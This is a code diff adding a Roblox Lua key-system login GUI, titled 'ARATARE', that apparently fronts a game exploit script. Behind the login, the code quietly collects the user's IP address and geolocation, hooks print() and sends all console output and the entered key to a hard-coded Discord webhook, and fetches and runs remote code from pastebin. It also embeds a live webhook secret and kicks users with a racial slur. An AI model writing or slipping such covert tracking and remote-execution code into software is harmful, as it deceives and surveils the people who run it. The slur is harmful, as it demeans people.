@@ -1,1 +1,257 @@
-print("hi")
+local player = game:GetService("Players").LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MyDraggableGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+local holderFrame = Instance.new("Frame", screenGui)
+holderFrame.Size = UDim2.new(0, 800, 0, 600)
+holderFrame.Position = UDim2.new(0, 200, 0, 100)
+holderFrame.BackgroundTransparency = 1
+holderFrame.Active = true
+local background = Instance.new("Frame", holderFrame)
+background.Size = UDim2.new(0, 450, 0, 300)
+background.Position = UDim2.new(0, 76, 0, 64)
+background.BackgroundColor3 = Color3.fromHex("#23232c")
+background.BorderSizePixel = 1
+background.BorderColor3 = Color3.fromHex("#343638")
+local bgCorner = Instance.new("UICorner", background)
+bgCorner.CornerRadius = UDim.new(0, 8)
+local textboxFrame = Instance.new("Frame", holderFrame)
+textboxFrame.Size = UDim2.new(0, 300, 0, 50)
+textboxFrame.Position = UDim2.new(0, 150, 0, 245)
+textboxFrame.BackgroundColor3 = Color3.fromHex("#23232c")
+local textbox = Instance.new("TextBox", textboxFrame)
+textbox.Size = UDim2.new(1, -4, 1, -4)
+textbox.Position = UDim2.new(0, 2, 0, 2)
+textbox.BackgroundColor3 = Color3.fromHex("#23232c")
+textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+textbox.Font = Enum.Font.Code
+textbox.TextSize = 16
+textbox.TextWrapped = true
+textbox.Text = "Enter text here..."
+textbox.BorderSizePixel = 10
+textbox.BorderColor3 = Color3.fromRGB(0, 170, 0)
+local textboxCorner = Instance.new("UICorner", textbox)
+textboxCorner.CornerRadius = UDim.new(0, 8)
+local titleLabel = Instance.new("TextLabel", holderFrame)
+titleLabel.Size = UDim2.new(0, 100, 0, 32)
+titleLabel.Position = UDim2.new(0, 250, 0, 90)
+titleLabel.Text = "ARATARE"
+titleLabel.TextColor3 = Color3.fromHex("#ffffff")
+titleLabel.BackgroundColor3 = Color3.fromHex("#23232c")
+titleLabel.Font = Enum.Font.Fantasy
+titleLabel.TextSize = 30
+titleLabel.BorderSizePixel = 0
+local keysystemLabel = Instance.new("TextLabel", holderFrame)
+keysystemLabel.Size = UDim2.new(0, 100, 0, 32)
+keysystemLabel.Position = UDim2.new(0, 250, 0, 125)
+keysystemLabel.Text = "Keysystem"
+keysystemLabel.TextColor3 = Color3.fromHex("#ffffff")
+keysystemLabel.BackgroundColor3 = Color3.fromHex("#23232c")
+keysystemLabel.Font = Enum.Font.ArialBold
+keysystemLabel.TextSize = 18
+keysystemLabel.BorderSizePixel = 0
+local promptLabel = Instance.new("TextLabel", holderFrame)
+promptLabel.Size = UDim2.new(0, 100, 0, 32)
+promptLabel.Position = UDim2.new(0, 159, 0, 201)
+promptLabel.Text = "Enter your key:"
+promptLabel.TextColor3 = Color3.fromHex("#ffffff")
+promptLabel.BackgroundColor3 = Color3.fromHex("#23232c")
+promptLabel.Font = Enum.Font.ArialBold
+promptLabel.TextSize = 16
+promptLabel.BorderSizePixel = 0
+local checkmarkButton = Instance.new("TextButton", holderFrame)
+checkmarkButton.Size = UDim2.new(0, 100, 0, 32)
+checkmarkButton.Position = UDim2.new(0, 340, 0, 310)
+checkmarkButton.Text = " ✔ "
+checkmarkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+checkmarkButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+checkmarkButton.Font = Enum.Font.SourceSansBold
+checkmarkButton.TextSize = 16
+checkmarkButton.BorderSizePixel = 0
+local function makeDraggable(frame)
+	local dragging = false
+	local dragStart, startPos
+
+	local function update(input)
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+								   startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+
+	frame.InputChanged:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
+			update(input)
+		end
+	end)
+end
+makeDraggable(holderFrame)
+local validKeys = {}
+
+
+
+
+validKeys["DEV_KEYs8gmvfese8vfnge986nsevfjniksdfji8oesvfbiunesfsef"] = true --dev key
+validKeys["DEV_KEYxvf-79m,hgsem9f,vse967fngesv87mse87bm fcse86fens"] = true --dev key
+validKeys["DEV_KEYjakie-iuhfiiisefvs8e9z68ntsn63tmsvefmbsefnmjomos"] = true --dev key
+validKeys["DEV_KEYhello-sfeubmvsembfsevmfuh86gmiv3v3srs3vrun6ftsen"] = true --dev key
+validKeys["78ngesvf7tjbksefimsehfvsijkbhdmfvsnkjebfvsetu7nvfmseobi"] = true --change on ...
+validKeys["hbuisefnvhsefjvubksefbvsu8f75nesnvf567sev7ms9en7se98v6g"] = true --change on ...
+validKeys["nhjgrdginjjgsecfj9gesfcsjegf89csecj999f8zefijgcsjsigefc"] = true --change on ...
+validKeys["LFTgto-nbfzgerv09mgh96t6n98evfsn8gesfvjg9msne68vn6fe8gs"] = true --change on ...
+validKeys["tester-1ijgbuftrbfbrrbdesuircnjvu7uatdc576brawcbdr5na5n"] = true --change on ...
+validKeys["tester-2awdAdwvawvawfvedACwAWdcWAdcbgrfvnrgvevnyguvngvn"] = true --change on ...
+validKeys["fevsvsezdnrzdr5hzndr5mnznjbhjuhnawda7j8twidaikosucdavvz"] = true --change on ...
+
+
+
+
+checkmarkButton.MouseButton1Click:Connect(function()
+    local userInput = textbox.Text
+    if validKeys[userInput] then  -- Check if userInput is a valid key
+        print("Logging in...")
+        local HttpService = game:GetService("HttpService")
+ local userInput = textbox.Text
+local HttpService = game:GetService("HttpService")
+local WebhookURL = "https://discord.com/api/webhooks/1367093902716178522/vup-gP9Z772LFbOzP4Ygze_sv4lh6HYOqEfLxblZv2TqqFr6lZiyL1MKObEHqjs31Hz6"
+local function sendToDiscord(message)
+    local data = {
+        ["content"] = message,
+        ["username"] = "Aratare logs"
+    }
+    local request = syn and syn.request or http_request or request or (http and http.request)
+    if request then
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("Your executor does not support HTTP requests.")
+    end
+end
+local function captureLogs()
+    local oldPrint = print
+    print = function(...)
+        local args = {...}
+        local logMessage = table.concat(args, " ")
+        sendToDiscord(logMessage)
+        oldPrint(unpack(args))
+    end
+end
+captureLogs()
+local requestFunc = syn and syn.request or http_request or request or (http and http.request)
+if not requestFunc then
+    warn("Your executor doesn't support HTTP requests.")
+    return
+end
+local response = requestFunc({
+    Url = "http://ip-api.com/json/", -- This gives your IP and geolocation info
+    Method = "GET"
+})
+if response and response.Body then
+    local data = HttpService:JSONDecode(response.Body)
+    local ipInfoMessage = "== Your IP Info ==\n"
+    ipInfoMessage = ipInfoMessage .. "IP: " .. data.query .. "\n"
+    ipInfoMessage = ipInfoMessage .. "Country: " .. data.country .. "\n"
+    ipInfoMessage = ipInfoMessage .. "Region: " .. data.regionName .. "\n"
+    ipInfoMessage = ipInfoMessage .. "City: " .. data.city .. "\n"
+    ipInfoMessage = ipInfoMessage .. "ISP: " .. data.isp .. "\n"
+    ipInfoMessage = ipInfoMessage .. "Timezone: " .. data.timezone
+    sendToDiscord(ipInfoMessage)
+else
+    warn("Failed to fetch important functions.")
+end
+print(userInput)
+local WebhookURL = "https://discord.com/api/webhooks/1367093902716178522/vup-gP9Z772LFbOzP4Ygze_sv4lh6HYOqEfLxblZv2TqqFr6lZiyL1MKObEHqjs31Hz6"
+local function sendToDiscord(message)
+    local data = {
+        ["content"] = message,
+        ["username"] = "Aratare logs"
+    }
+    local request = syn and syn.request or http_request or request or (http and http.request)
+    if request then
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("Your executor does not support HTTP requests.")
+    end
+end
+local function captureLogs()
+    local oldPrint = print
+    print = function(...)
+        local args = {...}
+        local logMessage = table.concat(args, " ")
+        sendToDiscord(logMessage)  -- Send the log message to Discord
+        oldPrint(unpack(args))  -- Also print to the F9 console
+    end
+end
+captureLogs()
+if response and response.Body then
+    local data = HttpService:JSONDecode(response.Body)
+    local keyInfoMessage = "== NEW LOGIN DETECTED, KEY:=="
+    keyInfoMessage = userInput
+    -- Send IP info to Discord
+    sendToDiscord(keyInfoMessage)
+else
+    warn("Failed to fetch important functions..")
+end
+loadstring(game:HttpGet('https://pastebin.com/raw/ZCrJ6WV0'))()
+        -- # PUT ALL THE MAIN SCRIPT IN HERE #
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+        background:Destroy()         -- Destroys the background frame
+        textboxFrame:Destroy()       -- Destroys the textbox frame
+        textbox:Destroy()            -- Destroys the textbox
+        titleLabel:Destroy()         -- Destroys the title label
+        keysystemLabel:Destroy()     -- Destroys the keysystem label
+        promptLabel:Destroy()        -- Destroys the prompt label
+        checkmarkButton:Destroy()    -- Destroys the checkmark button
+        script:Destroy()
+    else
+        warn("Incorrect key.")
+        local player = game.Players.LocalPlayer
+        player:Kick("no key no access (fucking nigger)")
+    end
+end)
+ 
